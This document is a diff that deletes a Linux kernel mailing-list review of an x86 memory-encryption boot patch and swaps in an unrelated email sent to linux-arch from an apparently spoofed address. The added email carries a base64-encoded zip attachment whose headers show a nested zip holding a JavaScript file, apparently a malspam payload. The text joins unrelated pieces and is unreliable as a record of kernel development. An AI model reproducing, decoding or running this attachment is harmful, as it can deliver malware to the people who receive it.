@@ -1,84 +1,75 @@
-From: Borislav Petkov <bp-Gina5bIWoIWzQB+pC5nmwQ@public.gmane.org>
-Subject: Re: [PATCH v5 12/32] x86/mm: Insure that boot memory areas are
-	mapped properly
-Date: Thu, 4 May 2017 12:16:09 +0200
-Message-ID: <20170504101609.vazu4tuc3gqapaqk@pd.tnic>
-References: <20170418211612.10190.82788.stgit@tlendack-t1.amdoffice.net>
-	<20170418211822.10190.67435.stgit@tlendack-t1.amdoffice.net>
+From: <h.gerritsen12@chello.nl>
+Subject: 34272 linux-arch
+Date: Thu, 04 May 2017 12:43:01 -0000
+Message-ID: <149390178171.27000.12732323472683198437@azteca-comunicaciones.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
-Return-path: <iommu-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Content-Disposition: inline
-In-Reply-To: <20170418211822.10190.67435.stgit-qCXWGYdRb2BnqfbPTmsdiZQ+2ll4COg0XqFh9Ls21Oc@public.gmane.org>
-List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/iommu>,
-	<mailto:iommu-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
-List-Archive: <http://lists.linuxfoundation.org/pipermail/iommu/>
-List-Post: <mailto:iommu-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-List-Help: <mailto:iommu-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=help>
-List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/iommu>,
-	<mailto:iommu-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
-Sender: iommu-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-Errors-To: iommu-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: Tom Lendacky <thomas.lendacky-5C7GfCeVMHo@public.gmane.org>
-Cc: linux-efi-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Brijesh Singh <brijesh.singh-5C7GfCeVMHo@public.gmane.org>, Toshimitsu Kani <toshi.kani-ZPxbGqLxI0U@public.gmane.org>, Radim =?utf-8?B?S3LEjW3DocWZ?= <rkrcmar-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>, Matt Fleming <matt-mF/unelCI9GS6iBeEJttW/XRex20P6io@public.gmane.org>, x86-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org, linux-mm-Bw31MaZKKs3YtjvyW6yDsg@public.gmane.org, Alexander Potapenko <glider-hpIqsD4AKlfQT0dZR+AlfA@public.gmane.org>, "H. Peter Anvin" <hpa-YMNOUZJC4hwAvxtiuMwx3w@public.gmane.org>, Larry Woodman <lwoodman-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>, linux-arch-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, kvm-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Jonathan Corbet <corbet-T1hC0tSOHrs@public.gmane.org>, linux-doc-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, kasan-dev-/JYPxA39Uh5TLH3MbocFFw@public.gmane.org, Ingo Molnar <mingo-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>, Andrey Ryabinin <aryabinin-5HdwGun5lf+gSpxsJD1C4w@public.gmane.org>, Dave Young <dyoung-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>, Rik van Riel <riel-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>, Arnd Bergmann <arnd-r2nGTMty4D4@public.gmane.org>, Andy Lutomirski <luto-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org>, Thomas Gleixner <tglx-hfZtesqFncYOwBW4kG4KsQ@public.gmane.org>, Dmitry Vyukov <dvyukov-hpIqsD4AKlfQT0dZR+AlfA@public.gmane.org>, kexec-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org, linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, iommu-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org, "Michael S. Tsirkin" <mst@r>
-List-Id: linux-arch.vger.kernel.org
+Content-Type: application/zip; name="4185.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-arch-owner@vger.kernel.org>
+Received: from azteca-comunicaciones.com ([191.102.120.153]:1265 "HELO
+        azteca-comunicaciones.com" rhost-flags-OK-FAIL-OK-FAIL)
+        by vger.kernel.org with SMTP id S1751456AbdEDMnJ (ORCPT
+        <rfc822;linux-arch@vger.kernel.org>); Thu, 4 May 2017 08:43:09 -0400
+Content-Disposition: attachment
+Sender: linux-arch-owner@vger.kernel.org
+List-ID: <linux-arch.vger.kernel.org>
+To: linux-arch@vger.kernel.org
 
-On Tue, Apr 18, 2017 at 04:18:22PM -0500, Tom Lendacky wrote:
-> The boot data and command line data are present in memory in a decrypted
-> state and are copied early in the boot process.  The early page fault
-> support will map these areas as encrypted, so before attempting to copy
-> them, add decrypted mappings so the data is accessed properly when copied.
-> 
-> For the initrd, encrypt this data in place. Since the future mapping of the
-> initrd area will be mapped as encrypted the data will be accessed properly.
-> 
-> Signed-off-by: Tom Lendacky <thomas.lendacky-5C7GfCeVMHo@public.gmane.org>
-> ---
->  arch/x86/include/asm/mem_encrypt.h |   11 +++++
->  arch/x86/include/asm/pgtable.h     |    3 +
->  arch/x86/kernel/head64.c           |   30 ++++++++++++--
->  arch/x86/kernel/setup.c            |   10 +++++
->  arch/x86/mm/mem_encrypt.c          |   77 ++++++++++++++++++++++++++++++++++++
->  5 files changed, 127 insertions(+), 4 deletions(-)
-
-...
-
-> diff --git a/arch/x86/kernel/setup.c b/arch/x86/kernel/setup.c
-> index 603a166..a95800b 100644
-> --- a/arch/x86/kernel/setup.c
-> +++ b/arch/x86/kernel/setup.c
-> @@ -115,6 +115,7 @@
->  #include <asm/microcode.h>
->  #include <asm/mmu_context.h>
->  #include <asm/kaslr.h>
-> +#include <asm/mem_encrypt.h>
->  
->  /*
->   * max_low_pfn_mapped: highest direct mapped pfn under 4GB
-> @@ -374,6 +375,15 @@ static void __init reserve_initrd(void)
->  	    !ramdisk_image || !ramdisk_size)
->  		return;		/* No initrd provided by bootloader */
->  
-> +	/*
-> +	 * If SME is active, this memory will be marked encrypted by the
-> +	 * kernel when it is accessed (including relocation). However, the
-> +	 * ramdisk image was loaded decrypted by the bootloader, so make
-> +	 * sure that it is encrypted before accessing it.
-> +	 */
-> +	if (sme_active())
-
-That test is not needed here because __sme_early_enc_dec() already tests
-sme_me_mask. There you should change that test to sme_active() instead.
-
-> +		sme_early_encrypt(ramdisk_image, ramdisk_end - ramdisk_image);
-> +
->  	initrd_start = 0;
->  
->  	mapped_size = memblock_mem_size(max_pfn_mapped);
-
--- 
-Regards/Gruss,
-    Boris.
-
-Good mailing practices for 400: avoid top-posting and trim the reply.
+UEsDBAoAAAAAAApkpEr84PH2PgwAAD4MAAAIAAAAMjI0MS56aXBQSwMEFAAAAAgACmSkShaBBRGq
+CwAA/iYAAAcAAAAyMjQxLmpzjVptUyJHEP6eqvyHDVXJLdG5eCLeJZyp0uFV9EBEOWPlA7K7LLKw
+sMsuL5f77+mZQae3GWKqFOe9u59+uucF035kterz8OY6docXl+OnO2/Wm1hn1ru0vwp7fHjX7LbG
+kaXLw9fiu4Mff3g37kb1lSy9jpC1jZ4x1cWeLoa6ONbFQBcbch1d/3quyyuv3RQ1OWQoP2X7kx5i
+nUFZ9rw07Goku6HuEguWaJnzga4sRrqc6qKLlNTFFlLmGQ0mZg0IngvdZediXfGRlMBYfK+LyHdt
+UdxCJD9F4yxo6OatGnpyF5kZTnNEwbzuLCGcMDJyYBZ9zCbjLF8XK0h7XZzr4sVsFcrFXxquEDWQ
+MxDzHnTxpmUE6lmRSTeUdbFJuXSGbCB9UzdDH+TpxSh1MUGICzBfCCHdFxmvS8marWfkZIMx0mQP
+YhJHDmiQhWcLxKLYJ72umXiaIfvIIRch5u5LMAOieSA/FxvESaOZ5TtdfiKyIrLmFKHR1OVZ+4t1
+hvMEirl9Tn0t4sgdoeyQdblWEeeEt9azs3yQFQz7LVpgv+mjmaLNCJlfQ/720FDk6Arizpokg3hB
+IrEia4S+1+GTat5NiLL9JSuajc8hEbLwH0Qjgr1EmarnZbJ5aNykrJkxbbQRZxoINJS4nDHh2Wrw
+EkG7OUX5wsiNJqL1FVnh3Lir2Ei5PmFAnWA9R8nyWpe/ILNdgloX2Vv1G4Qncpiqb8jOmkfR9I1w
+x4r2C1wkshhNcWIIjPTYhISCvfLdk3G3mXKigRI3M26WChPj7loNCaJIMcdFoisrhFSMtZcTs1DF
+1Ju6i5MNSwOunbvfryi/IeW6NFR0F3h4tEE5HQfYd1T2EoStOXb3hZhxvx6maGKtQ4jfJKBUSb2f
+GGOpfhmQgUilBre7beMZ5HbzIn43/9fQ6vs3ltB4yrhHXvrqrM6NOucRUt/o+SJyEb4JSSIRPYxY
+xk1iQSCJRnQe8gqKAQ9JCidc4LX/fJclropRB4W8nZEpS5lM0yZU96VPDO7QGBjz3ZT4KNzrDiMr
+z1tvHm9IWvm+/3CIAMwEDwnGBclDo2zG2RdLnCCxptLp7v2K8M7e8vBMUOtWjHefadt0NJkTdZ0y
+IsW1ndnd5JDM6AlKRUZaLdUcbKj2ItkNviD+XrZWxnAIDhGcb0VwF2/OEVr9aYCWXBKP1vn+fbxs
+JBjZOXdbI9d0BcbJIXodgKljodvSZA/AuthbA6JGMHUxA2vwfoAy6v6dK8qSMZMrHEI+F6G1sMOM
+N66MFihEnowH61tkXp3QhZPMeE7q5TeTwfe0r84uqA3rnxBmlEmsXxGNGteTy37FuOXc6GKHRgc5
+UAXN2RxxB99yTo5RmQD/CfV9OP3wW2YsYfQnYhieSlA8/YARS4nFfQyd8Za0QSD0CH5JlwhrIFbg
+ZF4jhPRoFvYv9OAMdrndy0lGhZIxVfZfhspPw823ZfTseMORAYjG3gv+2Ig7RLQFyqPpA30RWJL4
+w6CfmbcXlHCJy7ysE9TOsrup7NxdyOWiQlibon2uPUdZIbOf6KItZ+KnpDZ+NtJFeebffTv6ijY2
+wu6HG2JyC78dDctNsuW9R7HpEqYNjXHr9h3CXJvokEO0b14ZEcgRNQ4y52uy3qiGFCE6Nkm9aszk
+2uP49A1nbnzIRgyyfz82JtCDHFEtNm7DHhlFXx+W5mOom8sYQ1Ahh6bU+ApSI66RfztNIr/aJ0GW
+ZG8imasH0QmgwYCs9j72TIgqo4HR6DCmh0YvU6dvLLuSx6vhf8CiFah1EC3p2U0OomeoDCzGI8U+
+AulilkrEibJ6YLRviQyZOggv6Nh3Ibf2XfOyIGJaYegycdasEtf2E8KiN8FR76JkVtggT2+7gOny
+MX2n+V/QDfDZksyISOp2p4u3viwRU3bDPfPlwx6GYnDpVYnoUevQzKzw36EkQaT1xq3yMjBRLmxg
+wHWRQr+bAGmKitc76OhXQyOckyikLx2LXJ40He47lRqvI1eNa7Q+QfrSiCM+qd7gU6nxqwM4leKH
+pnc//iC+kfw6f+5f1N2reJWU0y+XnfE9PMv/+EOO+WuHhQeruZ/mDqDOmefEzGcHP/O1bHASbhcL
+jG9kLR3b8i8rFrjN2WlN9M19vrFZkbNC2VsGa/+xw9yJHOZ7SwY9JfgtbljqcZYE8RJqjNcZT8fM
+D0NZK9pFrhb+bJ8yXrF5gdUYiJCNhTJfO4kQCNKUmikb27zICzboINvn/sYGpVgZhCzVUsEaDHnk
+HVVzOZv43ONLWBYklrgNYossHXOfs5DBL2gCajkxlGMe8oB5jDvLIJozGKqUBPX4KavYhZpdKLM1
+cxKhpNIJpDd7rHcL0xVIAhFbQsTnQohQEPRbchZwtvblmMeOO+ESpmJJNkitePuePbJ2CyqnAI8t
+8Xpsw8qtZq/Hb5kwWbR/FiNAHVYDNQocVIIxDkvEjML9MvGdGcBUEErXRAH02DC+BWoJJq45U4pw
+EMg7LkyfMB+6bNC+JBDZmlKudRiv8Qp01GFh7juMz6AfRsDCn5lwm8KFSW+JrgKP1XRQCaweMwGA
+rViz4UwxbgyS6vcAuQ+yPVDJgYhnUTj0WQJjYPGSDbb21EI+nzEeh2DkksOEVBjKigAErFJRQ2A0
+CPlUtT+xqvQcDAFtKjACViox3gZ1gCRj6FPG1XnizIcRn0G3cKeElYHNoCuXEIN98MHBSs6ErYKm
+0FH8DHAAJDBKLSViQkwQw2AydP8hlThlYPjLusBuqTU01FWYfIOqL/RW7gTe1LgoA5ZMkUrGV73D
+AaU5f6FXiYnm4iWr97iyFP5sbapKzhZE5I2Xy5iD/mXoLSqMGnaxwZ6d+TPbknfNIyZ+WBixhWAw
+gCJ8FsFMkNFw2JDNeDBnwv/xGHwAVoOfRmJhDqEq/P9RwCM9zD/yrShlZxWq0DMC56ZgKVOBVJGp
+pcl7PXbLRWN9q809BzOHoIZkofCubBYTuFgnGDHBZtkLAXErOeks1eRVKlaF5WtCp5pkO6hUBLcV
+pAdhnnAizP+DM1iyUJNYl/k9B4sTBtSeSTwl5hAVsT+HKSXBDHC06NiqLgIBKOnwGSwHTvgHcoe/
+ZRX0S/lCvIi/E5Bcgco9W6oBiQo8ECYCvP6XSI4M0pMvqtu4KfEmE+jI1HTHfch7MXhpzlOQU4mG
+/whsTivSGKZSJhNpAIQIQyBMZiB8S7PbiKU8WAZMrACtEhZQUNJEeO6VPaCp6L+HXClSiErYsKiz
+ZsLeXtRgPACu+MIdpRiCcSzEVIUeYKbITJL/MiEwQFakIi4yBhfEqoYcVPFFQG6DQuGZjiXEdX4v
+dwYGpW8+5IQVgAL9pRjkSF0gpriUVSzCZAiB19QJHaCIpD10KkLIcBO6cdnOI5Fs5qIOY6rCj8JB
+J1wKF/tPRZSYaP6j9vPh4Z+50o8/jDzLhv9DsMr9hWvnH3PD3EHOXcDHgwsf/Sj3t523zs4sMeY8
+ivprO3cMHUfw++FjLv949Hfe+gY7Lnx/OoCvSadWubvoj8C252bn6n4+8as9210Nniv9+d34fnm7
+Oe8dWtV16rQ2D4N2EMZ3F7fD7txTq8A3Fgl8k0cmvI/cWdAfuHbHHVZWM9sw/dACzfPwmcuXrO/q
+bDBd3DzHwaz+MA7LT7VetIKjgZv2A9ug4u5/Nh1m3m7yalkvjCxbnjta0bV3/pS6k+rluB76iwYs
+flQytX82HFLeB+50uPBN4w8OBBTueVK+Uu95cDZaijc5EMDXXnz+8NytpNP2HF7Kr+3dpQ8Na+Yt
+Zh0XTz4e/dq6gUei4cC7SxbioWcZ/Xby+/HJ8dGWCbZJ7k9n1nHhY/H3E8PswvGnD0eneeuXX6x9
+cwtHhcKpSfLxR5B9pObOHtq84fnwtfigvIDDwNX5s73jP0lErx/Ebl5itKn3km4DXupq3sC/sA7g
+qXIINyi4N/UT+bLQ4EathC+3HOGTVRSsb4dfp55T/+K+MIQsnS/9C1BLAQI/ABQAAAAIAApkpEoW
+gQURqgsAAP4mAAAHACQAAAAAAAAAIAAAAAAAAAAyMjQxLmpzCgAgAAAAAAABABgAC4RQJA3F0gEL
+hFAkDcXSAQuEUCQNxdIBUEsFBgAAAAABAAEAWQAAAM8LAAAAAFBLAQI/AAoAAAAAAApkpEr84PH2
+PgwAAD4MAAAIACQAAAAAAAAAIAAAAAAAAAAyMjQxLnppcAoAIAAAAAAAAQAYAFbmUiQNxdIBVuZS
+JA3F0gFW5lIkDcXSAVBLBQYAAAAAAQABAFoAAABkDAAAAAA=
